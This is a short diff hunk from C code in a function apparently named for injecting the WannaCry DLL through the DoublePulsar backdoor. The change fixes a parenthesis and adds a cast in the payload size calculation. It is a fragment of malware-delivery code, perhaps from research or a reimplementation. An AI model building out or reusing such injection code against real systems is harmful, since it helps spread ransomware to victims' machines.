@@ -218,7 +218,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	//not sure what is going on here, but looks like the total_size is getting populated here
 	if (&DLLPayload[shellcode_payload_size] % 4)
 	{
-		 total_size = 4 * DLLPayload[shellcode_payload_size] / 4) + 4;
+		 total_size = 4 * ((signed int)DLLPayload[shellcode_payload_size] / 4) + 4;
 	}
 	else
 	{
